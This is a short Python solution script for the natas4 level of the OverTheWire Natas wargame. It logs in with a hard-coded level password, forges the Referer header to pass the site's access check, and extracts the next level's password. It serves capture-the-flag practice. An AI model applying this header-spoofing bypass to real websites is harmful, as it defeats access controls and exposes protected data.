import requests
import re

user = "natas4"
pwd = "Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ"

header = {"Referer": "http://natas5.natas.labs.overthewire.org/"}

url = 'http://%s.natas.labs.overthewire.org/' % user
session = requests.Session()

response = session.get(url, auth=(user,pwd), headers=header)
content = response.text

print(re.findall('for natas5 is (.*)',content)[0])